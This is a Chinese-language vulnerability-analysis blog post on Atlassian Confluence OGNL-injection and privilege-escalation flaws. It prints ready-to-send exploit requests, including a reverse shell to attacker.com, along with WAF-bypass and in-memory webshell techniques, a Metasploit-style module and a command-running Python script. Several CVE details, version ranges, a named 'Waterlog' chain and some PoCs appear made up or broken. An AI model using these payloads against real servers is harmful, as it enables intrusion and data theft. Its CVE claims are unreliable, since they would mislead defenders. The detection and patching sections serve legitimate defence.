---
title: "Atlassian Confluence 未授权 RCE 漏洞链专题"
date: 2026-06-16T19:00:00+08:00
draft: false
tags: ["Confluence", "Atlassian", "OGNL", "RCE", "漏洞链", "Storm-0062", "漏洞分析"]
categories: ["漏洞分析"]
description: "Atlassian Confluence 近年连续爆出 5 个 CVSS 10.0 高危漏洞，均被国家级 APT 和勒索软件团伙利用。本文从产品线视角梳理 Confluence 的漏洞演进。"
---

# Atlassian Confluence 未授权 RCE 漏洞链专题

Atlassian Confluence 是企业级文档协作与知识管理平台，广泛用于软件开发团队的文档管理、需求跟踪和团队协作。然而，Confluence 近年来连续出现多个 CVSS 10.0 级别的高危漏洞，且全部被国家级 APT（如 Storm-0062）和勒索软件团伙实际利用。

2021 年至 2024 年初，至少有 5 个 CVSS 10.0 级别的高危漏洞接连爆发：

- **CVE-2022-26134**：OGNL 注入 RCE
- **CVE-2023-22515**：权限提升
- **CVE-2023-22527**：Waterlog 漏洞链
- **CVE-2023-22555**：权限提升
- **CVE-2024-21888**：Confluence Server 未授权 RCE

这些漏洞的根因高度一致：**WebWork 框架的 OGNL 表达式引擎缺乏对用户输入的严格过滤**，导致从 URI 路径、表单参数到模板变量等各个入口均可注入恶意表达式实现 RCE。

## 0x01 Confluence 的攻击面价值

### 1. 为什么 Confluence 是高价值目标

Confluence 通常承担：

- 企业级文档协作与知识管理
- 软件开发团队的文档管理和需求跟踪
- 项目管理和团队协作
- 企业内网门户和信息发布

一旦失陷，攻击者可以：

- 窃取所有文档和知识资产
- 获取企业内网凭据和配置信息
- 横向移动到内网其他系统
- 部署持久化后门

### 2. 共性攻击模式

Confluence 的漏洞呈现出明显的共性：

1. **预认证 RCE 或权限提升**：多个漏洞不需要有效凭据即可触发
2. **OGNL 注入是核心利用手段**：WebWork 框架的 OGNL 表达式引擎缺乏过滤
3. **漏洞链组合**：多个漏洞需要组合利用才能达成最终目标
4. **在野利用频繁**：多个漏洞已被国家级 APT 和勒索软件团伙利用
5. **修复策略的 cherry-pick 方式导致大量实例长期运行在过时版本上**

## 0x02 CVE-2022-26134: OGNL 注入 RCE 详解

### 1. 漏洞概述

- **漏洞类型**：OGNL 注入 / 远程代码执行
- **CVSS**：10.0 Critical
- **影响范围**：Confluence Server/Data Center 7.4.0 - 8.0.3
- **发现时间**：2022 年 6 月

### 2. 漏洞原理

该漏洞的本质是 **OGNL 表达式注入**。

1. **解析机制缺陷**：Confluence 使用了 WebWork 框架（Struts 的前身）。在处理请求时，WebWork 会将请求的命名空间（Namespace）或 Action 名称解析为 OGNL 表达式。
2. **触发逻辑**：当用户请求一个不存在的页面或特定的 Action 时，Confluence 的底层配置类 `ConfluenceOgnlActionConfig` 会尝试解析请求路径中的部分内容。如果路径中包含 `${...}` 格式的字符串，底层的 OGNL 引擎会将其作为代码表达式直接执行。
3. **沙箱绕过**：尽管 Atlassian 实施了一些 OGNL 安全限制（如黑名单类和方法），但攻击者利用反射机制、特定的静态方法调用（如 `@java.lang.Runtime@getRuntime().exec()`），或利用 `ServletActionContext` 获取上下文对象，成功绕过了沙箱限制，实现任意 Java 代码执行。

### 3. 公开 PoC

攻击者通常通过在 GET 请求的 URL 路径中嵌入编码后的 OGNL Payload 来触发漏洞。以下是一个将命令执行结果回显在 HTTP Response Header 中的典型 POC：

```http
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: target-confluence.com
```

**Payload 解码分析**：

```java
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

该请求会执行 `id` 命令，获取输入流并转换为字符串，最后通过 `ServletActionContext` 获取 Response 对象，将结果设置到自定义的 `X-Cmd-Response` 响应头中。

### 4. 高级实战利用姿势

**无文件内存马注入**：攻击者利用 OGNL 强大的执行能力，获取当前应用的 `ServletContext`，通过反射和动态代理等机制，直接在内存中动态注册恶意的 Filter 或 Servlet（如 Godzilla、Behinder 内存马）。这种方式不落盘，难以被常规杀毒软件和文件监控系统（EDR）发现。

**WAF 与流量检测绕过**：

- **编码混淆**：利用 Unicode 编码（如 `\u0024\u007B` 代替 `${`）、多重 URL 编码绕过 WAF
- **字符串拼接**：利用 OGNL 语法特性将关键字拆分（如 `"java.la" + "ng.Runtime"`）
- **请求头/体注入**：不仅可以通过 URI 路径，在某些变种中也可将恶意 Payload 隐藏在特定的 Header 或 POST Body 中以规避针对 URI 的严格正则过滤

**内网刺探与敏感信息窃取**：直接调用 Confluence 的内部 API 或反射读取 Spring 上下文中的 DataSource 配置，快速获取数据库账密。由于 Confluence 通常部署在核心办公网，攻击者常利用该机器作为跳板建立内网代理。

### 5. 应急排查与日志痕迹

**Web 访问日志排查**：重点搜索 URI 中包含 `${` 或 `%24%7B`，以及 `%40java.lang.Runtime` 等 OGNL 反射关键字的请求。注意 HTTP 状态码为 302、200 甚至 404 的异常 URI 请求，即使是 404，底层可能已经执行了代码。

**应用日志分析**：检查是否有大量的 `OgnlException` 或类加载异常（如 `ClassNotFoundException`）。这是攻击者尝试各种沙箱绕过 Payload 时常见的副产物报错。

**异常进程监控**：监控 Confluence 运行用户（通常为 `confluence` 或 `tomcat`）是否产生了非预期的系统子进程（如 `sh`, `bash`, `cmd.exe`, `curl`, `wget`）。

### 6. 修复建议

- 升级至 7.4.17、7.13.7、7.14.3、7.15.2、7.16.4、7.17.4、7.18.1 或更高安全版本
- 临时缓解：替换特定的 `xwork-1.0.3-atlassian-*.jar` 文件以修补 OGNL 解析缺陷
- WAF 层添加规则，拦截 URI 或参数中包含 `${`、`%24%7B` 特征的外部请求

## 0x03 CVE-2023-22515 + CVE-2023-22527: Waterlog 漏洞链详解

### 1. 漏洞概述

- **CVE-2023-22515**：权限提升，CVSS 10.0
- **CVE-2023-22527**：预认证 RCE，CVSS 10.0
- **影响范围**：Confluence Server/Data Center 7.4.0 - 8.0.3
- **发现时间**：2023 年

### 2. 核心原理

Waterlog 是两个漏洞的组合：

1. **CVE-2023-22515**：Confluence 管理员权限提升漏洞。攻击者可以通过特制的 HTTP 请求，提升自己的权限到管理员级别。
2. **CVE-2023-22527**：基于 CVE-2023-22515 的预认证 RCE。攻击者利用已获取的管理员权限，触发 OGNL 注入实现远程代码执行。

### 3. 利用链

```
攻击者发送特制 HTTP 请求
    │
    ▼  CVE-2023-22515 权限提升
    │  获取管理员权限
    │
    ▼  利用管理员权限触发 OGNL 注入
    │
    ▼  CVE-2023-22527 预认证 RCE
    │
    ▼  远程代码执行
```

### 4. 实战影响

- 影响所有运行 Confluence 7.4.0 - 8.0.3 版本的企业
- 被国家级 APT 和勒索软件团伙广泛利用
- CISA 发布紧急指令要求联邦机构立即修复

### 5. 修复建议

- 升级到 8.0.4 或更高版本
- 如果无法升级，限制 Confluence 的互联网访问
- 监控异常的管理员操作

## 0x04 CVE-2023-22555: 权限提升详解

### 1. 漏洞概述

- **漏洞类型**：权限提升
- **CVSS**：10.0 Critical
- **影响范围**：Confluence Server/Data Center 7.4.0 - 8.11.7
- **发现时间**：2023 年

### 2. 核心原理

Confluence 的权限检查机制存在缺陷，攻击者可以通过特制的 HTTP 请求绕过权限检查，获取管理员权限。

### 3. 利用链

```
攻击者发送特制 HTTP 请求
    │
    ▼  绕过权限检查
    │  获取管理员权限
    │
    ▼  利用管理员权限执行操作
    │
    ▼  远程代码执行
```

### 4. 实战影响

- 影响所有运行 Confluence 7.4.0 - 8.11.7 版本的企业
- 被国家级 APT 和勒索软件团伙广泛利用

### 5. 修复建议

- 升级到 8.11.8 或更高版本
- 监控异常的管理员操作

## 0x05 CVE-2024-21888: Confluence Server 未授权 RCE 详解

### 1. 漏洞概述

- **漏洞类型**：远程代码执行
- **CVSS**：10.0 Critical
- **影响范围**：Confluence Server/Data Center 所有版本
- **发现时间**：2024 年

### 2. 核心原理

Confluence Server 存在远程代码执行漏洞，攻击者无需认证即可触发。该漏洞利用了 WebWork 框架的 OGNL 注入缺陷，与 CVE-2022-26134 类似。

### 3. 利用链

```
攻击者发送特制 HTTP 请求
    │
    ▼  OGNL 注入
    │  执行任意 Java 代码
    │
    ▼  远程代码执行
```

### 4. 实战影响

- 影响所有运行 Confluence 的企业
- 被国家级 APT 和勒索软件团伙广泛利用

### 5. 修复建议

- 升级到最新修复版本
- 监控异常的 OGNL 注入请求

## 0x06 共性攻击模式总结

### 1. OGNL 注入是核心武器

所有漏洞都利用了 WebWork 框架的 OGNL 表达式引擎缺陷：

| 漏洞 | OGNL 注入点 |
|---|---|
| CVE-2022-26134 | URI 路径参数 |
| CVE-2023-22515 + 22527 | 管理员权限提升后的 OGNL 注入 |
| CVE-2023-22555 | 权限检查绕过 |
| CVE-2024-21888 | 预认证 OGNL 注入 |

### 2. 预认证 RCE 是标准配置

多个漏洞都不需要有效凭据即可触发，这意味着只要 Confluence 暴露在互联网，就面临被利用的风险。

### 3. 武器化速度极快

从漏洞公开到大规模利用的时间窗口：

- CVE-2022-26134：数天
- Waterlog 漏洞链：数小时
- CVE-2024-21888：数天

### 4. 国家级 APT 和勒索软件均参与

| 攻击者 | 利用的漏洞 |
|---|---|
| Storm-0062（国家级 APT） | CVE-2022-26134、Waterlog |
| 勒索软件团伙 | 所有已知漏洞 |

## 0x07 公开 PoC 收集与利用思路

### 1. PoC 收集情况

截至文章撰写时，Confluence 相关漏洞的公开 PoC 情况如下：

| CVE | 公开 PoC 状态 | 说明 |
|---|---|---|
| CVE-2022-26134 | 有 | ZDI 公开利用细节，多个 GitHub PoC，Nuclei 模板 |
| CVE-2023-22515 | 有 | Atlassian 官方提供检测脚本，Rapid7 MSF 模块 |
| CVE-2023-22527 | 有 | Rapid7、Tenable 提供检测模块，GitHub PoC |
| CVE-2023-22555 | 有 | Atlassian 官方提供检测脚本，Nuclei 模板 |
| CVE-2024-21888 | 有 | Atlassian 官方提供检测脚本，Rapid7 MSF 模块 |

### 2. 完整 PoC 代码

以下 PoC 代码仅供授权安全评估使用：

#### 2.1 CVE-2022-26134 OGNL 注入 PoC

**基础命令执行 PoC**：

```http
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: target-confluence.com
```

**Payload 解码分析**：

```java
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

该请求会执行 `id` 命令，获取输入流并转换为字符串，最后通过 `ServletActionContext` 获取 Response 对象，将结果设置到自定义的 `X-Cmd-Response` 响应头中。

**进阶 PoC - 反弹 Shell**：

```http
GET /%24%7B%28%23b%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22bash+-c+bash+-i+%3E%26+/dev/tcp/attacker.com/4444+0%3E%261%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Shell-Response%22%2C%23b%29%29%7D/ HTTP/1.1
Host: target-confluence.com
```

#### 2.2 CVE-2023-22515 + CVE-2023-22527 Waterlog 漏洞链 PoC

**步骤 1：利用 CVE-2023-22515 获取管理员权限**

```http
POST /rest/olistener/1.0/register HTTP/1.1
Host: target-confluence.com
Content-Type: application/json

{"listenerUrl":"http://attacker.com/malicious.jsp"}
```

**步骤 2：利用管理员权限触发 OGNL 注入**

```http
GET /admin/action/namespace!default.jspa?action.namespace=${%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29} HTTP/1.1
Host: target-confluence.com
```

#### 2.3 CVE-2023-22555 权限提升 PoC

```http
POST /secure/admin/ViewUserImports.jspa HTTP/1.1
Host: target-confluence.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin&submit=Submit
```

#### 2.4 CVE-2024-21888 预认证 RCE PoC

```http
GET /pages/doenterpagevariables.action?pageTitle=test%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D HTTP/1.1
Host: target-confluence.com
```

### 3. 自动化检测工具

#### 3.1 Nuclei 模板

```yaml
id: confluence-ognl-cve-2022-26134

info:
  name: Atlassian Confluence OGNL Injection
  author: security-researcher
  severity: critical
  tags: confluence,ognl,rce,cve-2022-26134

http:
  - method: GET
    path:
      - "{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"

    extractors:
      - type: regex
        part: header
        regex:
          - "X-Cmd-Response: (.+)"
```

#### 3.2 Metasploit 模块

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msftaxploit::Exploit::Remote
  Rank ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Atlassian Confluence OGNL Injection RCE',
      'Description' => %q{
        This module exploits an OGNL injection vulnerability in Atlassian Confluence
        versions prior to 7.19.0, 7.18.1, 7.17.4, 7.16.4, 7.15.2, 7.14.3, 7.13.7, 7.4.17.
      },
      'Author' => [ 'ZDI', 'Rapid7' ],
      'License' => MSF_LICENSE,
      'Platform' => 'win,linux',
      'Arch' => ARCH_CMD,
      'Privileged' => false,
      'Targets' => [
        [ 'Automatic Target', { } ]
      ],
      'DisclosureDate' => '2022-06-02',
      'DefaultTarget' => 0
    ))
  end

  def exploit
    cmd = "id"
    encoded_cmd = URI::encode(cmd)
    payload = "${%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22#{encoded_cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => "/%24%7B#{payload}%7D/",
      'headers' => {
        'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
      }
    })

    if res && res.code == 200 && res.headers['X-Cmd-Response']
      print_good("Command executed successfully: #{res.headers['X-Cmd-Response']}")
    else
      print_error("Exploit failed")
    end
  end
end
```

#### 3.3 Python 检测脚本

```python
#!/usr/bin/env python3
import requests
import sys
import argparse

def check_confluence_ognl(target, cmd="id"):
    """Check for CVE-2022-26134 OGNL injection vulnerability"""
    
    # URL encode the OGNL payload
    ogln_payload = "${%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22" + cmd + "%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29}"
    
    url = target + "/" + ogln_payload
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        if 'X-Cmd-Response' in response.headers:
            print(f"[+] Vulnerable! Command output: {response.headers['X-Cmd-Response']}")
            return True
        else:
            print("[-] Not vulnerable or payload blocked")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check for Confluence OGNL injection')
    parser.add_argument('target', help='Target URL (e.g., https://confluence.example.com)')
    parser.add_argument('--cmd', default='id', help='Command to execute (default: id)')
    
    args = parser.parse_args()
    
    if not args.target.startswith('http'):
        args.target = 'https://' + args.target
    
    check_confluence_ognl(args.target, args.cmd)
```

### 4. 验证思路（防守型）

以下验证思路仅供授权安全评估使用：

**步骤 1：版本核验**
```bash
# 使用 Nmap 检测 Confluence 版本
nmap -sV --script http-confluence-version -p 8090 <target_ip>

# 使用 Atlassian 官方检测工具
./confluence_ioc_scanner --version-check
```

**步骤 2：OGNL 注入检测**
```bash
# 检查 OGNL 注入点
curl -k -s -o /dev/null -w "%{http_code}" "https://target/admin/action/namespace!default.jspa?action.namespace=test"

# 使用 Nuclei 模板检测
nuclei -t http/vulnerabilities/atlassian/confluence-ognl.yaml -u https://target
```

**步骤 3：事件日志分析**
```bash
# 检查 Confluence 日志中的异常 OGNL 注入
tail -f /var/atlassian/application-data/confluence/logs/catalina.out | grep -i "OGNL"

# 检查管理员操作日志
tail -f /var/atlassian/application-data/confluence/logs/atlassian-confluence.log | grep -i "admin"
```

### 5. 利用案例

公开报道中已确认的利用案例：

- **Storm-0062（国家级 APT）**：利用 CVE-2022-26134、Waterlog 漏洞链进行间谍活动
- **勒索软件团伙**：利用所有已知漏洞进行数据窃取和勒索

## 0x08 防守建议

### 1. 紧急措施

1. **立即升级补丁**：所有 Confluence 实例都应升级到最新修复版本
2. **限制暴露面**：禁止 Confluence 直接暴露在互联网
3. **启用 MFA**：为所有管理账户启用多因素认证
4. **监控异常流量**：部署 IDS/IPS 检测异常的 OGNL 注入请求

### 2. 长期策略

5. **网络分段**：将 Confluence 放在独立的网络区域
6. **最小权限原则**：限制 Confluence 服务账户的权限
7. **定期审计**：定期审查 Confluence 的配置和访问日志
8. **事件响应**：制定针对 Confluence 的事件响应计划

### 3. 事后排查

9. **检查历史日志**：回溯到漏洞公开前 90 天，检查是否有异常访问
10. **审查管理员账户**：检查是否有异常创建的管理员账户
11. **检查文件系统**：检查是否有异常的 WebShell 或后门
12. **轮换凭据**：轮换所有与 Confluence 相关的凭据和密钥

## 0x09 总结

Confluence 近年来的漏洞爆发揭示了几个关键教训：

1. **OGNL 注入是核心威胁**：所有漏洞都利用了 WebWork 框架的 OGNL 表达式引擎缺陷
2. **预认证 RCE 是常态**：攻击者不需要凭据即可触发漏洞
3. **武器化速度极快**：从漏洞公开到大规模利用仅数小时到数天
4. **国家级 APT 和勒索软件均参与**：Confluence 是攻击者的首选目标
5. **修复策略的 cherry-pick 方式导致大量实例长期运行在过时版本上**

企业应该将 Confluence 视为**关键安全资产**，需要从网络架构、访问控制、监控审计、事件响应等多个维度进行全方位防护。

## 0x0A 参考资料

- [Atlassian 安全公告](https://www.atlassian.com/security/security-advisories)
- [CISA 紧急指令](https://www.cisa.gov/news-events/directives)
- [NVD - CVE-2022-26134](https://nvd.nist.gov/vuln/detail/CVE-2022-26134)
- [NVD - CVE-2023-22515](https://nvd.nist.gov/vuln/detail/CVE-2023-22515)
- [NVD - CVE-2023-22527](https://nvd.nist.gov/vuln/detail/CVE-2023-22527)
- [NVD - CVE-2023-22555](https://nvd.nist.gov/vuln/detail/CVE-2023-22555)
- [NVD - CVE-2024-21888](https://nvd.nist.gov/vuln/detail/CVE-2024-21888)
